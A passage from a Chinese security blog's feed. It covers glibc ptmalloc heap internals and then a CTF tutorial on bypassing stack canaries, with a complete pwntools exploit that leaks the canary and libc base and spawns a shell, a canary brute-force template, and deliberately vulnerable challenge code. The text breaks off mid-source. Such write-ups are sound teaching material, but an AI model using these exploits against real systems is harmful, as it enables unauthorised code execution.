chunk 相邻的空闲 chunk 合并后的大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 时，内存碎片可能比较多了，就需要把 fast bins 中的 chunk 都进行合并，以减少内存碎片对系统的影响。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   FASTBIN_CONSOLIDATION_THRESHOLD is the size of a chunk in free()</span></span><br><span class="line"><span class="comment">   that triggers automatic consolidation of possibly-surrounding</span></span><br><span class="line"><span class="comment">   fastbin chunks. This is a heuristic, so the exact value should not</span></span><br><span class="line"><span class="comment">   matter too much. It is defined at half the default trim threshold as a</span></span><br><span class="line"><span class="comment">   compromise heuristic to only attempt consolidation if it is likely</span></span><br><span class="line"><span class="comment">   to lead to trimming. However, it is not dynamically tunable, since</span></span><br><span class="line"><span class="comment">   consolidation reduces fragmentation surrounding large chunks even</span></span><br><span class="line"><span class="comment">   if trimming is not used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FASTBIN_CONSOLIDATION_THRESHOLD (65536UL)</span></span><br></pre></td></tr></table></figure><h5 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h5><p>Small bins 中每个 chunk 的大小与其所在的 bin 的 index 的关系为：chunk_size &#x3D; 2 * SIZE_SZ *index，具体如下</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222321055.png"></p><p>Small bins中有62个循环双向链表，每个链表中存储的chunk大小一致。<strong>Small bins中每个bin对应的链表采用FIFO规则，所以先被释放的chunk会被先分配出去。</strong></p><p>fast bin和small bin中的chunk大小会有一部分重合，fast bin中的chunk有一部分是会被放到small bin中的。</p><h5 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h5><p>large bin中一共包括了63个bin，每个bin中chunk大小不一致。63个bin被分为了6组，每组bin中chunk大小的公差一致。</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222322565.png"></p><h5 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h5><p>可以视为空闲chunk回归之前的缓冲区，双向循环链表，存放所有不满足fast bin且未被整理的chunk。malloc的时候如果在其他bin中没有找到合适的就会在Unsorted Bin找并且根据大小放到对应的bin里面。</p><p>unsorted bin 处于之前所说的 bin 数组下标 1 处。所以 unsorted bin 只有一个链表。unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源：</p><ul><li>较大的chunk被分割后。如果剩下的部分大于MINSIZE，就会被分配到Unsorted Bin中</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</li></ul><h5 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h5><p>libc2.26以后出现的，FILO结构，最大位0x410。</p><p>每个tcache bin最多能有七个，prev_inuse不置零，不参与合并。指针直接指向chunk的userdata部分。</p><h4 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h4><p>程序在第一次进行malloc时，heap会被分为两块，一块给用户，另一块是top chunk，其实就是处于当前堆的物理地址最高的chunk。这个chunk不属于任何一个bin，作用是当所有的bin都无法满足用户请求大小时，如果大小不小于指定大小就进行分配，并将剩下的大小作为新的top chunk。否则对heap进行拓展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</p><p>prev_inuse为1，不参与合并。</p><h4 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h4><p>当需要分配的chunk要很大时，并且fast bin和bins以及top chunk也不能满足需求时，普陶，ptmalloc就会使用mmap直接使用内存映射来将页映射到进程空间。这样分配的chunk会在free时直接解除映射还给操作系统，再次引用就会引起segmentation fault错误。这种chunk不包含在任何bin中。</p><h4 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h4><p>Last remainder是另外一种特殊的chunk，就像top chunk和mmaped chunk一样，不会在任何bins中找到这种chunk。ptmalloc2找到的chunk可能并不和申请的内存大小一致，分割后的剩余部分称为last remainder chunk，unsorted bin也会存。top chunk 分割剩下的部分不会作为 last remainder。</p><h3 id="宏观结构"><a href="#宏观结构" class="headerlink" title="宏观结构"></a>宏观结构</h3><h4 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h4><p>在第一次申请内存时，都会有独立的arena。</p><p>一个线程申请的一个或多个堆包含很多信息，Arena就是管理线程中这些堆。</p><p>主线程arena包含start brk和brk之间的这片连续内存称为堆。</p><h5 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h5><ul><li>一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的</li><li>主线程创建的堆称为：main arena（主分配区），不同的线程维护不同的堆称为：per thread arena（线程分配区）</li></ul><h5 id="多线程管理"><a href="#多线程管理" class="headerlink" title="多线程管理"></a>多线程管理</h5><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">32位系统中：Number of arena = 2 * number of cores + 1.</span><br><span class="line">64位系统中：Number of arena = 8 * number of cores + 1</span><br></pre></td></tr></table></figure><p>当线程个数大于系统能维护的最大分配区个数，比如说一台只有一个核心处理器的机器要运行一个有四个线程的应用程序，那么glibc malloc就要确保4个线程能够正确地共享三个分配区。</p><ul><li>首先，glibc malloc会遍历所有的可用分配区，遍历的过程中会尝试锁该分配区。当一个分配区对应的线程未使用堆内存则表示可锁。那么如果该分配区可锁，就可以直接被使用。</li><li>没找到的话，那么等待寻找的线程的malloc就会阻塞，直到有可以用的为止。</li><li>阻塞解除时，会先尝试使用最近访问的主分配区，如果可用那么就会直接使用，否则会再次阻塞。</li></ul><blockquote><p>如果没有主分配区，所有线程的操作都在主分配区上进行，互相竞争锁会影响分配效率。所以增加了非主分配区支持，使用环形链表管理主分配区和非主分配区，提高malloc的分配效率。申请小块内存时，ptmalloc在整理时会进行加锁的操作。线程很多时就会导致等待时间加长，性能下降。</p></blockquote><h4 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h4><p>子线程的arena可以有多片连续内存，称为heap，每一个heap都有自己的heap header（堆信息结构体），heap header 是通过链表相连接的。</p><p>heap_info的作用是在线程申请内存时记录heap区域的信息，并且当该heap的资源被使用完之后，就必须要再次申请内存。一般来说，申请的heap是不连续的，因此需要记录不同heap之间的链接结构。</p><p><strong>该数据结构是专门为从 Memory Mapping Segment 处申请的内存准备的，即为非主线程准备的。</strong></p><p>主要结构：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> HEAP_MIN_SIZE (32 * 1024)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HEAP_MAX_SIZE</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DEFAULT_MMAP_THRESHOLD_MAX</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)</span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> HEAP_MAX_SIZE (1024 * 1024) <span class="comment">/* must be a power of two */</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps</span></span><br><span class="line"><span class="comment">   that are dynamically created for multi-threaded programs.  The</span></span><br><span class="line"><span class="comment">   maximum size must be a power of two, for fast determination of</span></span><br><span class="line"><span class="comment">   which heap belongs to a chunk.  It should be much larger than the</span></span><br><span class="line"><span class="comment">   mmap threshold, so that requests with a size just below that</span></span><br><span class="line"><span class="comment">   threshold can be fulfilled without creating too many heaps.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* A heap is a single contiguous memory region holding (coalesceable)</span></span><br><span class="line"><span class="comment">   malloc_chunks.  It is allocated with mmap() and always starts at an</span></span><br><span class="line"><span class="comment">   address aligned to HEAP_MAX_SIZE.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="type">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="type">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="type">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><p>描述堆的基本信息，包括：</p><ul><li>堆所属的arena地址</li><li>线程申请的堆用完后会再次申请，prev就记录了上一个heap_info的地址，可以看到每个heap_info是通过单向链表进行链接的。</li><li>size为堆的大小</li><li>最后一部分对齐</li></ul><h4 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h4><p>记录每个arena当前申请的内存的具体状态，是否有空闲chunk或者空闲chunk大小为多少等等。无论是thread arena还是main arena都只有一个malloc state结构。主线程的arena保存在libc.so数据段里，其他线程的arena保存在给该arena分配的heap里。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>glibc中的arena就是用该结构体表示的</li><li><strong>last_remainder：</strong>当次arena中产生last_remainder时，此成员被初始化，并且指向arena中的last_remainder</li><li><strong>bins数组：</strong>存储的是该领域管理的smallbins，unsortedbin，largebins</li><li><strong>binmap变量</strong>：系统查看有哪些垃圾箱链中有块时，不可能去fastbinsY和箱数组一个一个的遍历。通过binmap变量，采用二进制存储，将二进制位与数组的索引相对，系统查找箱链时可以通过按位与来查询，这样更高效。虽然unsigned int的二进制位比数组总元素少，但是系统不会有那么多的bin链，不需要考虑这个问题。</li></ul><h4 id="几个结构之间的关系"><a href="#几个结构之间的关系" class="headerlink" title="几个结构之间的关系"></a>几个结构之间的关系</h4><p>想象你正在组织一场音乐会，这个音乐会需要为观众提供座位。你是音乐会的经理，负责分配座位并管理这个过程。</p><ul><li>Arena（堆区）：音乐会大厅就像一个 Arena，代表整个音乐会场地。在这个大厅里，观众可以坐下，享受音乐会。</li><li>Heap_info：音乐会大厅被划分成多个区域，每个区域都有一组座位。每个区域都由一个 Heap_info 结构来描述，其中包含了关于该区域的信息，比如座位数量、座位的位置等。每个 Heap_info 代表一个区域。</li><li>Malloc_state：你是音乐会经理，负责管理每个区域的座位分配。你的助手是 Malloc_state，他帮助你记录哪些座位已经被分配，哪些还没有。他会维护一个详细的列表，以便在观众进入音乐会大厅时，能够快速找到一个合适的座位。</li><li>Malloc_chunk：观众就像是需要座位的内存分配请求。每位观众需要一个座位（内存块），你的助手（Malloc_state）会根据已经分配的座位和空余的座位来分配给观众。已分配的座位（malloc_chunk）会被记录在 Malloc_state 中的列表中，以确保不会为同一个座位分配给多个观众。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#fast-bin">堆相关数据结构 - CTF Wiki (ctf-wiki.org)</a></p></li><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/implementation/basic/">基础操作 - CTF Wiki (ctf-wiki.org)</a></p></li><li><p><a href="https://www.yuque.com/hxfqg9/bin/nvrgrs#PpHw2">堆相关知识 (yuque.com)</a></p></li><li><p><a href="https://blog.csdn.net/qq_41453285/article/details/96847761">堆漏洞挖掘:02—堆的glibc实现与Arena（struct malloc_state、struct _heap_info）_glibc thread arena-CSDN博客</a></p></li><li><p>《CTF实战 - 技术、解题与进阶》</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary保护绕过</title>
      <link href="/article/4622.html"/>
      <url>/article/4622.html</url>
      
        <content type="html"><![CDATA[<h1 id="Canary保护绕过"><a href="#Canary保护绕过" class="headerlink" title="Canary保护绕过"></a>Canary保护绕过</h1><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p>之前学习的栈溢出，有很多都是没有限制输入长度或限制不严格的函数等向栈中写入构造的数据，传统的防御机制就是开启 Canary保护，Canary 实现和设计思想都比较简单, 就是插入一个值，在stack overflow发生的高危区域的栈空间尾部放入一串8字节的随机数据，当函数返回时检测Canary的值是否经过了改变，以此来判断stack&#x2F;buffer overflow是否发生。若发生改变则说明栈被改变了，进入<code>__stack_chk_fail</code>。验证成功则跳到<code>leave 和 ret</code>正常的返回。</p><p>当程序启用Canary编译后，在函数序言部分会取fs寄存器0x28处的值，存到EBP - 0x4(32位)或RBP - 0x8(64位)的位置。 这个操作即为向栈中插入Canary值，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>栈结构大致如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>函数返回之前会将该值取出并与 fs:0x28 的值进行异或，结果为0就说明canary未被修改，函数正常返回</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="泄露栈中的Canary"><a href="#泄露栈中的Canary" class="headerlink" title="泄露栈中的Canary"></a>泄露栈中的Canary</h3><p>Canary设计以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串，简单点说就是正常情况下，不能被 printf 等输出函数输出，防止泄露。 泄露栈中的 Canary 的思路是覆盖 Canary 的最后一个字节”\x00”，来打印出剩余的 Canary 部分。</p><p>这种利用方式需要存在合适的输出函数或者通过格式化字符串泄露。可能需要第一次泄露Canary，之后再次溢出恢复Canary最后一位，才能控制执行流程。</p><p>题目：<a href="https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1696648030623">pwn1</a></p><p>检查保护能看到Canary开启，有栈溢出并且有puts函数，v6就是canary，可以考虑puts输出Canary</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222314482.png" alt="image-20231007111838924"></p><p>Canary最低位设计为\x00，目的为截断字符串，通过栈溢出将canary最低位截断字符\x00覆盖，然后通过puts函数将输入的字符和剩余的canary输出，canary最低位补\x00就是canary的值。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh = process(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x88</span>)</span><br></pre></td></tr></table></figure><p>输入0x88字节数据后，加上最后一个\n将canary的最低位覆盖</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  <span class="comment"># 选择2，输出字符串</span></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;A\n&#x27;</span>)</span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))  <span class="comment">## 对canary解析</span></span><br></pre></td></tr></table></figure><p>puts输出</p><p>canary泄露后就是正常的栈溢出，通过one_gadget找到execve在动态链接库的地址</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222314806.png" alt="image-20231007112617224"></p><p>​利用<code>puts</code>函数泄露出<code>puts</code>函数在程序中的地址，puts输出需要用到rdi来传递参数</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222315348.png" alt="image-20231007113720383"></p><p>通过puts函数来找到execve的地址</p><p>最终代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line">pop_rdi = <span class="number">0x400a93</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;61.147.171.105&#x27;,62498)</span></span><br><span class="line">sh = process(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露canary地址</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;A\n&#x27;</span>)</span><br><span class="line">canary = u64(sh.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露puts函数实际地址</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">real_puts = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(real_puts))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取execve实际地址</span></span><br><span class="line">base = real_puts - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">execve = base + <span class="number">0x45216</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload溢出获取shell</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + p64(canary) + <span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span> + p64(execve)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="格式化字符串泄露Canary"><a href="#格式化字符串泄露Canary" class="headerlink" title="格式化字符串泄露Canary"></a>格式化字符串泄露Canary</h3><p>题目：<a href="https://adworld.xctf.org.cn/challenges/list?rwNmOdr=1696648030623">攻防世界-Mary_Morton</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4008EB</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x7F</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);          <span class="comment">//格式化字符串溢出</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400960</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);   <span class="comment">//栈溢出</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-&gt; %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>canary保护</p><p><img src="https://halloh-picloud.oss-cn-beijing.aliyuncs.com/img/202312222315258.png" alt="image-20231007131153404"></p><p>可以利用字符串漏洞，泄露canary的值，在函数返回时填回去，之后利用栈溢出返回到后门函数</p><h3 id="逐字节爆破Canary"><a href="#逐字节爆破Canary" class="headerlink" title="逐字节爆破Canary"></a>逐字节爆破Canary</h3><p>每次进程重启后的Canary不同，但是同一进程中不同线程的Canary是相同的，并且通过fork函数创建的子进程的Canary也是相同的，子进程会继承父进程的Canary。当子进程由于Canary不正确导致程序崩溃时，父进程不会崩溃，利用这样的特点就可以在子进程逐个字节将Canary爆破出来，爆破模板如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Brute forcing stack canary &quot;</span></span><br><span class="line"></span><br><span class="line">start = <span class="built_in">len</span>(p)</span><br><span class="line">stop = <span class="built_in">len</span>(p)+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(p) &lt; stop:</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">      res = send2server(p + <span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> res != <span class="string">&quot;&quot;</span>:</span><br><span class="line">         p = p + <span class="built_in">chr</span>(i)</span><br><span class="line">         <span class="comment">#print &quot;\t[+] Byte found 0x%02x&quot; % i</span></span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> i == <span class="number">255</span>:</span><br><span class="line">         <span class="built_in">print</span> <span class="string">&quot;[-] Exploit failed&quot;</span></span><br><span class="line">         sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-<span class="number">1</span>:-<span class="number">1</span>].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;   [+] SSP value is 0x%s&quot;</span> % canary</span><br></pre></td></tr></table></figure><p>例题：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* compile cmd: gcc source.c -m32 -o bin</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getflag</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    fgets(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    read(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title 